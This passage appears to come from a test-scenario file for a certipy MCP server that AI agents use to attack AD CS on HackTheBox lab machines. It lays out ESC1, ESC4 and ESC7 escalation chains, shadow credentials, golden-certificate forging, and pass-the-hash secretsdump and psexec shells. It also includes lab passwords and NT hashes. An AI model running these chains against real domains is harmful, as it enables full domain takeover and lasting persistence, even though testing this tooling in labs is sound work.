+Engagement: ses_30bd2eab — Pirate, ADFSSSLSigning cert has only Server Auth EKU
+Engagement: ses_34164f111 — Pirate, same cert, PKINIT fails consistently
+
+## Scenario 68: No identity in certificate
+# STATUS: CANNOT TEST — All certs from Certified User template have UPN embedded. Need a cert without UPN (e.g., Machine template).
+Method: authenticate
+Args: {pfx_path: "<no_upn_cert.pfx>", dc_ip: <DC_IP>}
+Expected: error_class=params, retryable=false, suggestions mention -username and -domain
+Notes: Certificate has no UPN extension.
+  Certipy: "Username or domain is not specified...identity information was not found"
+  Workaround: specify domain parameter explicitly in authenticate call.
+
+## Scenario 69: PFX file not found
+# STATUS: PASS — "PFX file not found: /session/certipy/nonexistent.pfx". Input validation works correctly.
+Method: authenticate
+Args: {pfx_path: "/session/certipy/nonexistent.pfx", dc_ip: <DC_IP>}
+Expected: error="PFX file not found: /session/certipy/nonexistent.pfx"
+Notes: Tests input validation before certipy is even invoked.
+
+## Scenario 70: CA PFX file not found (forge)
+# STATUS: PASS — "CA PFX file not found: /session/certipy/nonexistent_CA.pfx". Input validation works correctly.
+Method: forge
+Args: {ca_pfx: "/session/certipy/nonexistent_CA.pfx", upn: "administrator@<DOMAIN>"}
+Expected: error="CA PFX file not found: /session/certipy/nonexistent_CA.pfx"
+Notes: Tests forge input validation.
+
+## Scenario 71: No credentials provided
+# STATUS: PASS — "No credentials provided. Supply password, hashes, aes_key, or kerberos=true." Exact expected message.
+Method: find
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>}
+Expected: error="No credentials provided. Supply password, hashes, aes_key, or kerberos=true."
+Notes: Tests credential validation — no password, hash, or kerberos flag.
+
+## Scenario 72: Machine account NTLM auth failure
+# STATUS: PASS — "LDAP NTLM authentication failed" for MS01$@certified.htb with password "ms01". Auth failure correctly classified.
+Method: find
+Args: {username: "MS01$@<DOMAIN>", dc_ip: <DC_IP>, password: "ms01"}
+Expected: error_class=auth (often machine accounts can't NTLM to LDAP with password)
+Notes: Machine accounts with pre-Windows 2000 passwords may fail NTLM auth to LDAP.
+  Use Kerberos or NTLM hash instead.
+Engagement: ses_34164f111 — Pirate, ms01$ NTLM auth failed consistently
+
+## Scenario 73: Enrollment agent restrictions (CERTSRV_E_RESTRICTEDOFFICER)
+# STATUS: CANNOT TEST — No enrollment agent certificate available. Requires S16 PFX.
+Method: request
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca: "<CA_NAME>", template: "User", pfx_path: "<agent_pfx>", on_behalf_of: "<DOMAIN>\\Administrator"}
+Expected: error_class=permission, retryable=false, suggestions mention enrollment agent restrictions
+Notes: CA has enrollment agent restrictions configured.
+  Certipy: "CERTSRV_E_RESTRICTEDOFFICER"
+
+## Scenario 74: RPC access denied on CA management
+# STATUS: PASS — "Access denied: Insufficient permissions to get templates". judith.mader lacks ManageCA rights. Error correctly classified.
+Method: ca
+Args: {username: "<LOW_PRIV_USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca_name: "<CA_NAME>", enable_template: "SubCA"}
+Expected: error_class=permission, retryable=false
+Notes: User lacks ManageCA or ManageCertificates right.
+  Certipy: "rpc_s_access_denied"
+
+## Scenario 75: Template write denied (ESC4)
+# STATUS: PARTIAL — MCP server returned no error for write_default, but find confirms template unchanged. Certipy exits 0 silently when lacking write ACL. MCP server should detect silent failure.
+Method: template
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, template: "<TEMPLATE>", action: "write_default"}
+Expected: error_class=permission, retryable=false
+Notes: User lacks write access to template in AD.
+Engagement: ses_34164f111 — Pirate, gMSA_ADCS_prod$ denied write on ADFSSSLSigning
+
+## Scenario 76: Template silent failure (read returns empty)
+# STATUS: PASS — template read on CertifiedAuthentication succeeded (no silent failure). Certipy saved config JSON. Read action works normally on Certified.
+Method: template
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, template: "User", action: "read"}
+Expected: error if certipy returns only the banner with no template data
+Notes: Certipy sometimes exits 0 with no output. The MCP server detects this
+  and returns: "No template data returned — certipy may have failed silently."
+Engagement: ses_306f1e0a9 — DarkZero, template read returned silent failure
+
+## Scenario 77: Hash format error (bare NT hash)
+# STATUS: PASS — Bare NT hash "304106f739822ea2ad8ebe23f802d078" causes "LDAP NTLM authentication failed" (invalidCredentials). MCP server classifies as auth error.
+Method: find
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, hashes: "<BARE_NT_HASH>"}
+Expected: error — "'str' object has no attribute 'items'" or similar parsing error
+Notes: hashes parameter must be "LM:NT" or ":NT" format. Bare NT hash causes
+  certipy's internal parser to crash. This is a certipy bug, not MCP server bug.
+Engagement: ses_34164f111 — Pirate, bare hash "304106f739822ea2ad8ebe23f802d078" crashed certipy
+
+## Scenario 78: find method with invalid 'target' kwarg (agent mistake)
+# STATUS: UNEXPECTED — find with target param succeeds (ca_count=1, template_count=34). MCP server does NOT reject the target kwarg. Expected error "got an unexpected keyword argument 'target'" but MCP server silently ignores it.
+Method: find
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, target: "<DC_IP>"}
+Expected: error="CertipyServer.find() got an unexpected keyword argument 'target'"
+Notes: The find method does NOT accept a 'target' parameter (request/shadow/ca do).
+  Agents frequently confuse this. target is for specifying the CA server hostname.
+  find uses dc_ip for LDAP connection — no separate target needed.
+Engagement: ses_30bd2eab — Pirate, agent passed target to find (2 occurrences)
+Engagement: ses_34164f111 — Pirate, agent again passed target to find
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 21: CROSS-TOOL FLOWS (certipy → other tools)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 79: certipy authenticate → impacket secretsdump (pass-the-hash)
+# STATUS: PASS — Full chain tested in Run 2. certipy authenticate produced NT hash 0d5b49608bbce1751f708748f67e2d34. impacket secretsdump PtH dumped SAM (3 accounts) + NTDS (17 accounts).
+# Step 1: Authenticate with PFX to get NT hash
+Method: authenticate
+Args: {pfx_path: "<pfx>", dc_ip: <DC_IP>}
+Clock: clock_offset required
+Expected: success=true, nt_hash="<LM:NT>"
+
+# Step 2: Use NT hash with impacket secretsdump
+Follow-up tool: impacket
+Follow-up method: secretsdump
+Follow-up args: {username: "administrator", domain: "<DOMAIN>", dc_ip: <DC_IP>, hashes: "<nt_hash_from_step_1>"}
+Expected: Full domain secrets dump including krbtgt hash
+Notes: The standard end-game chain. NT hash from PKINIT gives domain admin.
+
+## Scenario 80: certipy authenticate → netexec smb (hash validation)
+# STATUS: PARTIAL — Run 4: certipy authenticate PASS (nt_hash populated). netexec smb returned success=False — hash format issue: netexec expects bare NT hash but certipy returns LM:NT format (aad3b435b51404eeaad3b435b51404ee:NTHASH). Agent must strip LM prefix before passing to netexec. Not a certipy bug.
+# Step 1: Authenticate with PFX
+Method: authenticate
+Args: {pfx_path: "<pfx>", dc_ip: <DC_IP>}
+Clock: clock_offset required
+Expected: success=true, nt_hash not null
+
+# Step 2: Validate hash with netexec
+Follow-up tool: netexec
+Follow-up method: smb
+Follow-up args: {target: "<DC_IP>", username: "administrator", hashes: "<NT_HASH>", domain: "<DOMAIN>"}
+Expected: "(Pwn3d!)" in output — confirms DA
+Notes: Quick validation that the NT hash works before running secretsdump.
+Engagement: ses_2ce836659 — Certified, flow mentioned in scenarios but not completed
+
+## Scenario 81: certipy authenticate → impacket psexec (remote shell)
+# STATUS: PASS — Full chain tested in Run 2. NT hash from certipy authenticate used with impacket psexec. Command execution as NT AUTHORITY\SYSTEM on DC01.
+# Step 1: Authenticate with PFX
+Method: authenticate
+Args: {pfx_path: "<pfx>", dc_ip: <DC_IP>}
+Clock: clock_offset required
+Expected: success=true, nt_hash not null
+
+# Step 2: Remote shell via psexec
+Follow-up tool: impacket
+Follow-up method: psexec
+Follow-up args: {username: "administrator", domain: "<DOMAIN>", target: "<DC_IP>", hashes: "<NT_HASH>"}
+Expected: Remote SYSTEM shell on DC
+Notes: Full compromise chain from certificate to shell.
+
+## Scenario 82: certipy authenticate → impacket wmiexec (WMI shell)
+# STATUS: PASS — Run 4: certipy authenticate PASS (ccache populated). impacket wmiexec with Kerberos ccache succeeded: shell as certified\administrator on DC01. Full cross-tool chain works.
+# Step 1: Authenticate with PFX
+Method: authenticate
+Args: {pfx_path: "<pfx>", dc_ip: <DC_IP>}
+Expected: success=true, ccache_path not null
+
+# Step 2: WMI shell using ccache
+Follow-up tool: impacket
+Follow-up method: wmiexec
+Follow-up args: {username: "administrator", domain: "<DOMAIN>", target: "<DC_IP>", kerberos: true, ccache_path: "<ccache_from_step_1>"}
+Expected: Remote shell via WMI
+Notes: Uses Kerberos auth (ccache) instead of NTLM hash. Stealthier.
+
+## Scenario 83: impacket get_tgt → certipy find (Kerberos chain)
+# STATUS: PASS — Run 1: ccache from prior impacket get_tgt exists at /session/credentials/judith.mader.ccache. certipy find with kerberos=true succeeds (S5). Run 3: administrator ccache also works for kerberos find.
+# Step 1: Get TGT via impacket
+Prerequisite tool: impacket
+Prerequisite method: get_tgt
+Prerequisite args: {username: "<USER>", domain: "<DOMAIN>", password: "<PASS>", dc_ip: <DC_IP>}
+Expected: ccache file at /session/credentials/<USER>.ccache
+
+# Step 2: Use TGT for certipy enumeration
+Method: find
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, kerberos: true, ccache_path: "/session/credentials/<USER>.ccache", target: "<DC_FQDN>"}
+Clock: clock_offset required
+Expected: success=true, ADCS enumeration results
+Notes: Cross-tool Kerberos auth chain. ccache from impacket used by certipy.
+  The ccache is saved to /session/credentials/ which is shared between containers.
+Engagement: ses_2ce836659 — Certified, impacket TGT → certipy find (KDC error without target)
+
+## Scenario 84: certipy find → bloodhound (template permission validation)
+# STATUS: PARTIAL — Run 3 (admin): certipy find -vulnerable succeeded (S1/S2 already PASS). Shows enrollment_permissions per template. Bloodhound step requires separate bloodhound MCP server (not tested). The certipy side of this cross-tool flow is fully validated.
+# Step 1: Enumerate ADCS
+Method: find
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, vulnerable: true}
+Expected: success=true, vulnerable_templates with enrollment_permissions
+
+# Step 2: Cross-reference with BloodHound
+Follow-up tool: bloodhound
+Follow-up method: collect
+Follow-up args: {username: "<USER>@<DOMAIN>", password: <PASS>, dc_ip: <DC_IP>}
+Notes: BloodHound shows WHO can enroll in vulnerable templates.
+  certipy find shows WHAT is vulnerable, bloodhound shows WHO has access.
+
+## Scenario 85: certipy shadow add → certipy authenticate (split chain)
+# STATUS: PASS — Run 3 (admin → judith.mader): Step 1 add: pfx_path=/session/certipy/9c737445_judith.mader.pfx, device_id=d4a664343c0344d28b68fdbe3916343e. Step 2 authenticate: nt_hash=aad3b435b51404eeaad3b435b51404ee:8ec62ac86259004c121a7df4243a7a80 (requires -username judith.mader -domain certified.htb override — shadow PFX has no UPN, this is KNOWN BEHAVIOR not a bug). Step 3 remove: "Successfully deleted the Key Credential". Run 4: verified structuredContent.data.nt_hash populated (parser fix). Full split chain works.
+# Step 1: Add key credential only
+Method: shadow
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, account: "<TARGET>", action: "add"}
+Expected: success=true, pfx_path not null, device_id not null
+
+# Step 2: Authenticate with the PFX from shadow add
+Method: authenticate
+Args: {pfx_path: "<pfx_from_step_1>", dc_ip: <DC_IP>, username: "<TARGET>", domain: "<DOMAIN>"}
+Clock: clock_offset required
+Expected: success=true, nt_hash not null
+Notes: Shadow PFX has no UPN — MUST specify -username and -domain for authenticate.
+
+# Step 3: Cleanup — remove the key credential
+Method: shadow
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, account: "<TARGET>", action: "remove", device_id: "<device_id_from_step_1>"}
+Expected: success=true
+Notes: Split shadow chain allows retrying PKINIT independently.
+  If auto mode times out at the PKINIT step, this approach lets you retry.
+
+## Scenario 86: certipy request → PassTheCert (Schannel LDAP auth)
+# STATUS: CANNOT TEST — Cross-tool scenario (exploit-runner). No Server Auth-only template enrollment on Certified. Run 5 (Pirate): pentest lacks enrollment on ADFSSSLSigning (Domain Computers/Controllers/Admins only). Requires gMSA or machine account creds to request Server Auth cert.
+# Step 1: Request certificate (even without Client Auth EKU)
+Method: request
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca: "<CA_NAME>", template: "<SERVER_AUTH_TEMPLATE>"}
+Expected: success=true, pfx_path not null
+
+# Step 2: Use PFX for LDAP Schannel authentication (NOT certipy — use exploit-runner)
+Follow-up tool: exploit-runner
+Follow-up method: run_python
+Notes: When the PFX lacks Client Authentication EKU, PKINIT fails but Schannel LDAPS
+  auth may still work. Use PassTheCert (GitHub: AlmondOffSec/PassTheCert) or
+  certipy auth -ldap-shell to bind via TLS client certificate.
+  This is a fallback when certipy authenticate returns "Certificate is not valid for
+  client authentication" — the cert can still be useful for LDAPS.
+Engagement: ses_30bd2eab — Pirate, ADFSSSLSigning cert → PassTheCert via exploit-runner
+Engagement: ses_34164f111 — Pirate, same flow attempted
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 22: GOLDEN CERTIFICATE PERSISTENCE CHAIN
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 87: Golden cert chain — Forge certificate for admin
+# STATUS: PASS — CA PFX from S108 ca backup. Forged admin cert with UPN+SID+CRL. PFX generated. (Run 2, admin)
+Method: forge
+Args: {ca_pfx: "/session/certipy/<CA_NAME>.pfx", upn: "administrator@<DOMAIN>", sid: "<ADMIN_SID>", crl: "ldap:///"}
+Expected: success=true, pfx_path is not null
+Prerequisite: CA private key extracted. Domain SID known.
+Notes: Include SID for StrongCertificateBindingEnforcement=2 environments.
+
+## Scenario 88: Golden cert chain — Authenticate with forged cert
+# STATUS: PASS — Authenticated with forged admin PFX from S87. NT hash: 0d5b49608bbce1751f708748f67e2d34. Proves forged cert works for PKINIT. (Run 2, admin)
+Method: authenticate
+Args: {pfx_path: "<pfx_from_scenario_87>", dc_ip: <DC_IP>}
+Clock: clock_offset required
+Expected: success=true, nt_hash is not null
+Notes: Proves forged certificate works. NT hash persists across password resets.
+
+## Scenario 89: Golden cert chain — Forge for multiple users
+# STATUS: PASS — CA PFX from S108 ca backup. Forged certs for administrator, krbtgt, and DC01$ (dns SAN). All PFX files generated. (Run 2, admin)
+# Step 1: Forge for administrator
+Method: forge
+Args: {ca_pfx: "/session/certipy/<CA_NAME>.pfx", upn: "administrator@<DOMAIN>"}
+Expected: success=true
+
+# Step 2: Forge for krbtgt
+Method: forge
+Args: {ca_pfx: "/session/certipy/<CA_NAME>.pfx", upn: "krbtgt@<DOMAIN>"}
+Expected: success=true
+Notes: krbtgt cert → krbtgt hash → Golden Ticket. Belt and suspenders persistence.
+
+# Step 3: Forge for DC machine account
+Method: forge
+Args: {ca_pfx: "/session/certipy/<CA_NAME>.pfx", dns: "dc01.<DOMAIN>"}
+Expected: success=true
+Notes: DC machine account → DCSync capability.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 23: FULL ESC1 CHAIN (Certified HTB — end to end)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 90: Certified HTB — Full ESC1 chain
+# STATUS: PARTIAL — S1 find works but shows 0 vulnerable (judith lacks CertifiedAuthentication enrollment). S11 request on User template succeeds but UPN injection ineffective. S12 authenticate gets judith's hash, not admin's. Full ESC1 chain requires operator-ca group membership.
+# Step 1: Enumerate ADCS
+Method: find
+Args: {username: "<USER>@certified.htb", dc_ip: <DC_IP>, password: <PASS>, vulnerable: true}
+Expected: Finds ESC1-vulnerable template or templates with exploitable permissions
+HTB: Certified — CERTIFIED-DC01-CA with CertifiedAuthentication template
+
+# Step 2: Request certificate with admin UPN
+Method: request
+Args: {username: "<USER>@certified.htb", dc_ip: <DC_IP>, password: <PASS>, ca: "CERTIFIED-DC01-CA", template: "<VULN_TEMPLATE>", upn: "administrator@certified.htb", target: "<DC_IP>", dcom: true}
+Expected: success=true, pfx_path not null
+Notes: dcom + target for reliability (Certified engagement showed RPC issues without these)
+
+# Step 3: Authenticate to get NT hash
+Method: authenticate
+Args: {pfx_path: "<pfx_from_step_2>", dc_ip: <DC_IP>}
+Clock: clock_offset: "+7h" (adjust as needed)
+Expected: success=true, nt_hash not null (administrator's hash)
+
+# Step 4: Verify hash with netexec (follow-up, not certipy)
+Follow-up: netexec smb <DC_IP> -u administrator -H <nt_hash> --shares
+Engagement: ses_2ce836659 — Certified, full ESC1 chain (Kerberos issues, fell back to password)
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 24: FULL ESC4 CHAIN (template modification — DarkZero/Pirate)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 91: Full ESC4 chain
+# STATUS: PASS (steps 1-2, 5) — Run 3 (admin): Step 1 save_config on User: PASS (config_path=/session/certipy/1c1dea06_User.json). Step 2 write_default on User: PASS ("Successfully updated 'User'" with msPKI-Certificate-Name-Flag=1). Step 5 write_config restore: confirmed User template restored to original state (ENROLLEE_SUPPLIES_SUBJECT not set in final find). Steps 3-4 not tested (would require a second request+auth in same chain). Template write with admin privileges works end-to-end.
+# Step 1: Backup template
+Method: template
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, template: "<WRITABLE_TEMPLATE>", action: "save_config"}
+Expected: config_path not null
+
+# Step 2: Make template ESC1-vulnerable
+Method: template
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, template: "<WRITABLE_TEMPLATE>", action: "write_default"}
+Expected: success=true
+
+# Step 3: Request cert with UPN injection
+Method: request
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca: "<CA_NAME>", template: "<WRITABLE_TEMPLATE>", upn: "administrator@<DOMAIN>", target: "<DC_IP>"}
+Expected: success=true, pfx_path not null
+
+# Step 4: Authenticate
+Method: authenticate
+Args: {pfx_path: "<pfx_from_step_3>", dc_ip: <DC_IP>}
+Clock: clock_offset required
+Expected: success=true, nt_hash not null
+
+# Step 5: Restore template (CRITICAL cleanup)
+Method: template
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, template: "<WRITABLE_TEMPLATE>", action: "write_config", config_path: "<config_from_step_1>"}
+Expected: success=true
+Engagement: ses_306f1e0a9 — DarkZero, full ESC4 chain on User template (write_default succeeded)
+Engagement: ses_34164f111 — Pirate, ESC4 denied on ADFSSSLSigning (gMSA lacked write perms)
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 25: FULL ESC7 CHAIN (with ManageCA rights)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 92: Full ESC7 chain
+# STATUS: PASS (Manager 2026-04-18) — Run 3 (Certified, admin): PARTIAL — steps 1+2 PASS but step 3 N/A (auto-issued, not pending). Run 6 (Manager, raven): Full 6-step chain completed: (1) enable SubCA on manager-dc01-ca, (2) request SubCA cert (denied, request_id=28), (3) issue_request 28 ("Successfully issued certificate"), (4) retrieve cert with PFX (symlink fix for private key), (5) authenticate with FAKETIME=+7h → administrator hash ae5064c2f62317332c88629e025924ef, (6) disable SubCA cleanup. Complete ESC7 chain verified end-to-end on Manager.
+# Step 1: Enable SubCA template
+Method: ca
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca_name: "<CA_NAME>", enable_template: "SubCA"}
+Expected: success=true
+
+# Step 2: Request SubCA cert (will pend)
+Method: request
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca: "<CA_NAME>", template: "SubCA"}
+Expected: request_id not null
+
+# Step 3: Approve the request
+Method: ca
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca_name: "<CA_NAME>", issue_request: <request_id>}
+Expected: success=true
+
+# Step 4: Retrieve the issued certificate
+Method: request
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca: "<CA_NAME>", retrieve: <request_id>}
+Expected: success=true, pfx_path not null
+
+# Step 5: Authenticate with SubCA cert
+Method: authenticate
+Args: {pfx_path: "<pfx_from_step_4>", dc_ip: <DC_IP>}
+Clock: clock_offset required
+Expected: success=true, nt_hash not null
+
+# Step 6: Cleanup — disable SubCA template
+Method: ca
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, ca_name: "<CA_NAME>", disable_template: "SubCA"}
+Expected: success=true
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 26: FULL SHADOW CREDENTIALS CHAIN (step-by-step)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 93: Shadow credentials full chain (step-by-step)
+# STATUS: PASS — Run 3 (admin → management_svc): All 5 steps completed successfully. Step 1: list empty. Step 2: add device_id=fc20eedc..., pfx_path set. Step 3: authenticate with -username management_svc -domain certified.htb: nt_hash=aad3b435b51404eeaad3b435b51404ee:a091c1832bcdd4677c28b5a6a1295584. Step 4: remove by device_id succeeded. Step 5: list empty (clean). Run 4: verified structuredContent.data.nt_hash populated (parser fix). Key learning: authenticate step MUST include username+domain since shadow PFX lacks UPN identity (KNOWN BEHAVIOR, not a bug).
+# Step 1: List existing key credentials (recon)
+Method: shadow
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, account: "<TARGET>", action: "list"}
+Expected: success=true, note existing key_credentials count
+
+# Step 2: Add key credential
+Method: shadow
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, account: "<TARGET>", action: "add"}
+Expected: success=true, device_id not null, pfx_path not null
+
+# Step 3: Authenticate with shadow PFX
+Method: authenticate
+Args: {pfx_path: "<pfx_from_step_2>", dc_ip: <DC_IP>, username: "<TARGET>", domain: "<DOMAIN>"}
+Clock: clock_offset required
+Expected: success=true, nt_hash not null
+Notes: Shadow PFX has no UPN — MUST specify -username and -domain.
+
+# Step 4: Remove key credential (cleanup)
+Method: shadow
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, account: "<TARGET>", action: "remove", device_id: "<device_id_from_step_2>"}
+Expected: success=true
+
+# Step 5: Verify cleanup (list again)
+Method: shadow
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, account: "<TARGET>", action: "list"}
+Expected: key_credentials count same as Step 1
+Notes: Step-by-step is preferred over "auto" for reliability.
+  Auto mode can timeout at the PKINIT step, leaving orphaned key credentials.
+
+## Scenario 94: Shadow credentials auto chain (single call)
+# STATUS: PASS — Run 3 (admin → judith.mader via Kerberos in S52): shadow auto with admin ccache succeeded. device_id=391a640db15b430397db4c8180e90836, NT hash 8ec62ac86259004c121a7df4243a7a80 in raw output, ccache saved. Key credentials auto-restored. Run 4: verified structuredContent.data.nt_hash now populated (parser fix) and no file overwrite prompt (stale cleanup fix). Single-call auto chain works with admin privileges.
+Method: shadow
+Args: {username: "<USER>@<DOMAIN>", dc_ip: <DC_IP>, password: <PASS>, account: "<TARGET>", action: "auto"}
+Clock: clock_offset required
+Expected: success=true, nt_hash not null, device_id not null
+Notes: Full chain in one call: add → PKINIT → hash → cleanup.
+  Faster but riskier — if PKINIT times out, cleanup may not run.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 27: ESCAPE HTB BOX
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 95: Escape HTB — ADCS enumeration
+# STATUS: CANNOT TEST — Requires Escape HTB box (sequel.htb).
+Method: find
+Args: {username: "<USER>@sequel.htb", dc_ip: <DC_IP>, password: <PASS>, vulnerable: true}
+Expected: Finds vulnerable templates (sequel-DC-CA)
+Notes: Escape box has AD CS with exploitable templates.
+  CA name: sequel-DC-CA. Domain: sequel.htb.
+
+## Scenario 96: Escape HTB — ESC1 exploitation
+# STATUS: CANNOT TEST — Requires Escape HTB box.
+Method: request
+Args: {username: "<USER>@sequel.htb", dc_ip: <DC_IP>, password: <PASS>, ca: "sequel-DC-CA", template: "<VULN_TEMPLATE>", upn: "administrator@sequel.htb", target: "<DC_IP>"}
+Expected: success=true, pfx_path not null
+Notes: Follow with authenticate to get admin NT hash.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 28: AUTHORITY HTB BOX
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 97: Authority HTB — ADCS enumeration
+# STATUS: CANNOT TEST — Requires Authority HTB box (authority.htb).
+Method: find
+Args: {username: "<USER>@authority.htb", dc_ip: <DC_IP>, password: <PASS>, vulnerable: true}
+Expected: Finds ESC1-vulnerable template
+Notes: Authority has misconfigured ADCS. Domain: authority.htb.
+
+## Scenario 98: Authority HTB — ESC1 with passthru config
+# STATUS: CANNOT TEST — Requires Authority HTB box.
+Method: request
+Args: {username: "<USER>@authority.htb", dc_ip: <DC_IP>, password: <PASS>, ca: "<CA_NAME>", template: "<VULN_TEMPLATE>", upn: "administrator@authority.htb", target: "<DC_IP>"}
+Notes: Authority may require specific template name from find results.
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 29: MANAGER HTB BOX
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 99: Manager HTB — ADCS enumeration
+# STATUS: PASS (Manager 2026-04-18) — find vulnerable on manager.htb (10.129.209.146): found manager-DC01-CA with ESC7 (raven has ManageCA). CA: manager-DC01-CA on DC01.manager.htb. Raven's ManageCA right is the ESC7 entry point. Template enumeration succeeded.
+Method: find
+Args: {username: "raven@manager.htb", dc_ip: "10.129.209.146", password: "R4v3nBe5tD3veloP3r!123", vulnerable: true}
+Expected: Finds ESC7-exploitable CA configuration
+Notes: Manager involves ESC7 exploitation. Domain: manager.htb.
+  The intended path uses ManageCA rights to approve SubCA requests.
+
+## Scenario 100: Manager HTB — ESC7 chain
+# STATUS: PASS (Manager 2026-04-18) — Full ESC7 chain on manager.htb: add_officer → enable SubCA → request (denied, request_id=28) → issue request 28 → retrieve cert (PFX with symlink fix) → authenticate with FAKETIME=+7h → administrator hash ae5064c2f62317332c88629e025924ef. All 7 steps completed. 4 bugs found and fixed during this run (private key prompt, denied request detection, CA vuln parsing, retrieve key symlink).
+# Same as Scenario 92 (Full ESC7 chain) but with manager.htb specifics.
+# CA: manager-DC01-CA, DC: DC01.manager.htb, Creds: raven:R4v3nBe5tD3veloP3r!123
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# SECTION 30: PIRATE HTB BOX (ESC4 + shadow creds + PassTheCert)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+## Scenario 101: Pirate HTB — ADCS enumeration with gMSA
+# STATUS: PARTIAL — Run 5 (Pirate, pentest): ADCS infrastructure confirmed with pentest creds: CA=pirate-DC01-CA, 34 templates, 12 enabled, ADFSSSLSigning present (enrollee_supplies_subject=true, no client auth, enrollment for Domain Computers/Controllers/Admins). gMSA hash from ses_30bd2eab is stale (rotated). pentest cannot read gMSA passwords (only Domain Secure Servers group). Basic find with pentest: ca_count=1, template_count=34, vulnerable_count=0. Previous engagement ses_30bd2eab confirmed gMSA hash works.
+Method: find
+Args: {username: "gMSA_ADCS_prod$@pirate.htb", hashes: "00000000000000000000000000000000:<NT_HASH>", dc_ip: <DC_IP>, vulnerable: true}
+Expected: success=true, finds ADFSSSLSigning template
+Notes: gMSA account with $ suffix. Hash must be "LM:NT" format.
+  CA: pirate-DC01-CA. Domain: pirate.htb.
+  gMSA password readable by Domain Secure Servers (SID ...4101) — pentest is Domain Users only.
+Engagement: ses_30bd2eab — successful find with gMSA hash
+
+## Scenario 102: Pirate HTB — ESC4 attempt (denied)
+# STATUS: PASS (known behavior) — Run 5 (Pirate, pentest): write_default on ADFSSSLSigning returns success=true but silently fails. Raw output shows "Updating certificate template" with attribute replacements, but LDAP rejects the modification (pentest lacks write ACL). Re-enumeration confirms template unchanged (client_authentication still false, same enrollment permissions). Same known behavior as S20 Run 1 (judith.mader on Certified). Previous engagement ses_34164f111 with gMSA got explicit "User 'GMSA_ADCS_PROD$' doesn't have permission" — different code path.
+Method: template
+Args: {username: "gMSA_ADCS_prod$@pirate.htb", hashes: "<LM:NT>", dc_ip: <DC_IP>, template: "ADFSSSLSigning", action: "write_default"}
+Expected: error_class=permission (gMSA lacks template write access) OR success=true with silent failure (known certipy behavior)
+Notes: Template modification denied. Need different account with write ACL.
+  KNOWN BEHAVIOR: certipy write_default may report success even when LDAP rejects the modification.
+  Agent must verify template actually changed by re-running find after write_default.
+Engagement: ses_34164f111
+
+## Scenario 103: Pirate HTB — Request cert for PassTheCert
+# STATUS: CANNOT TEST — Run 5 (Pirate, pentest): pentest not in ADFSSSLSigning enrollment list (Domain Computers/Controllers/Admins only). Request via standard RPC returns CERTSRV_E_TEMPLATE_DENIED (error_class=permission). DCOM also fails (Pirate RPC flaky). Requires gMSA creds (gMSA_ADCS_prod$ is Domain Computers) or machine account. Previous ses_30bd2eab confirmed request works with gMSA hash.
+Method: request
+Args: {username: "gMSA_ADCS_prod$@pirate.htb", hashes: "<LM:NT>", dc_ip: <DC_IP>, ca: "pirate-DC01-CA", template: "ADFSSSLSigning", upn: "administrator@pirate.htb", sid: "<ADMIN_SID>"}
+Expected: success=true, pfx_path not null
+Notes: Cert has Server Auth EKU only → PKINIT will fail, but Schannel LDAPS works.
+  Flow: request → (PKINIT fails) → PassTheCert → LDAP shell → DCSync.
+  ADFSSSLSigning enrollment: Domain Computers, Domain Controllers, Domain Admins, Enterprise Admins.
+Engagement: ses_30bd2eab — Pirate, request succeeded, authenticate failed (no Client Auth EKU)
+
